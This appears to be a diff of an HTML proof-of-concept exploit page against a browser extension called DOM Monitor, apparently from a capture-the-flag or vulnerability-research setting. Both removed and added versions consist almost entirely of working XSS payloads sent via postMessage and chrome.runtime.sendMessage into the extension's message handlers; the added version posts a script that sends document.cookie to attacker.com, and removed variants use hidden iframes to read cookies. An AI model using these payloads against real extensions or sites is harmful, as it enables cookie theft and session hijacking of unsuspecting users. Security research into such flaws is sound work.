@@ -1,100 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>DOM Monitor Exploit</title>
-  <script>
-    window.onload = function() {
-      console.log("Starting XSS injection through extension messaging...");
-      
-      // Set up a listener to see any response
-      window.addEventListener('message', function(event) {
-        console.log("Message received:", event.data);
-      });
-      
-      // Give the extension a moment to initialize
-      setTimeout(() => {
-        // Create the XSS payload targeting the domain header
-        const xssPayload = {
-          action: "update_counts",
-          domain: '<script>fetch("https://app.dom-monitor.fr/").then(r=>r.text()).then(t=>{console.log("Cookie:",document.cookie)})</script>',
-          counts: { fetch: 0, innerHTML: 0, setAttribute: 0, eval: 0 },
-          resourceCounts: { script: 0, img: 0, stylesheet: 0, font: 0, other: 0 }
-        };
-        
-        // Send the XSS payload via postMessage which will be processed by the extension
-        window.postMessage(xssPayload, "*");
-        
-        // Also try your suggested payload
-        const directPayload = {
-          action: "update_counts",
-          domain: '<div id="domainHeader" class="domain-header"><script>console.log("Flag cookie:", document.cookie)</script></div>',
-          counts: { fetch: 0, innerHTML: 0, setAttribute: 0, eval: 0 },
-          resourceCounts: { script: 0, img: 0, stylesheet: 0, font: 0, other: 0 }
-        };
-        
-        // Send the direct payload
-        window.postMessage(directPayload, "*");
-        
-        // Try another injection vector that opens a connection back to app.dom-monitor.fr
-        const cookieStealerPayload = {
-          action: "update_counts",
-          domain: '<img src=x onerror="var i=document.createElement(\'iframe\');i.src=\'https://app.dom-monitor.fr\';i.style=\'display:none\';document.body.appendChild(i);setTimeout(function(){console.log(\'Cookie from iframe:\',i.contentDocument.cookie)},1000)">',
-          counts: { fetch: 0, innerHTML: 0, setAttribute: 0, eval: 0 },
-          resourceCounts: { script: 0, img: 0, stylesheet: 0, font: 0, other: 0 }
-        };
-        
-        // Send the cookie stealer payload
-        window.postMessage(cookieStealerPayload, "*");
-        
-        // Try one with a more direct approach using open_sidepanel
-        const sidebarPayload = {
-          action: "open_sidepanel",
-          domain: 'http://localhost',
-          execute: '<script>console.log("Inside sidepanel:", document.cookie)</script>'
-        };
-        
-        // Send the sidebar payload
-        window.postMessage(sidebarPayload, "*");
-      }, 1000);
-      
-      // Try yet another approach - this time targeting the sidepanel directly
-      document.getElementById('start').addEventListener('click', function() {
-        console.log("Attempting sidepanel XSS...");
-        
-        // This will be rendered in the extension's panel
-        const sidepanelXSS = {
-          action: "update_method_counts",
-          domain: '<iframe src="https://app.dom-monitor.fr" onload="console.log(this.contentDocument.cookie)"></iframe><script>console.log("XSS in sidepanel:",document.cookie)</script>',
-          counts: { fetch: 0, innerHTML: 0, setAttribute: 0, eval: 0 },
-          resourceCounts: { script: 0, img: 0, stylesheet: 0, font: 0, other: 0 }
-        };
-        
-        // Try to send it directly to the runtime
-        try {
-          chrome.runtime.sendMessage(sidepanelXSS);
-        } catch(e) {
-          console.log("Chrome runtime not available, using postMessage");
-          window.postMessage(sidepanelXSS, "*");
-        }
-      });
-    };
-  </script>
-  <style>
-    #start {
-      cursor: pointer;
-      padding: 10px;
-      background: #2196F3;
-      color: white;
-      border-radius: 4px;
-      display: inline-block;
-      margin: 20px;
-    }
-  </style>
+    <title>DOM Monitor Extension Exploit</title>
 </head>
 <body>
-  <div id="start">Try SidePanel XSS</div>
-  
-  <!-- Also add a frame to app.dom-monitor.fr to ensure we have the context -->
-  <iframe src="https://app.dom-monitor.fr" style="width:1px;height:1px;border:none;"></iframe>
+    <h1>DOM Monitor Extension Exploit Demonstration</h1>
+    <p>This page demonstrates how an attacker could exploit the XSS vulnerability in the DOM Monitor extension.</p>
+    
+    <button id="start">Start Exploit</button>
+    
+    <script>
+        document.getElementById('start').addEventListener('click', function() {
+            // Create an invisible iframe to load the target page
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = 'https://app.dom-monitor.fr/'; // Target domain
+            document.body.appendChild(iframe);
+            
+            // Wait for the iframe to load
+            iframe.onload = function() {
+                console.log('Target page loaded, sending exploit message...');
+                
+                // XSS payload that would steal cookies
+                const xssPayload = '<script>fetch("https://attacker.com/steal?cookie="+encodeURIComponent(document.cookie))<\/script>';
+                
+                // Send message that will be processed by the extension
+                window.postMessage({
+                    action: "update_counts",
+                    domain: xssPayload,  // The vulnerable field
+                    counts: {
+                        fetch: 1,
+                        innerHTML: 1,
+                        setAttribute: 1,
+                        eval: 0
+                    },
+                    resourceCounts: {
+                        script: 1,
+                        img: 1,
+                        stylesheet: 1,
+                        font: 0,
+                        other: 0
+                    }
+                }, '*');
+                
+                console.log('Exploit message sent');
+            };
+        });
+    </script>
 </body>
 </html>
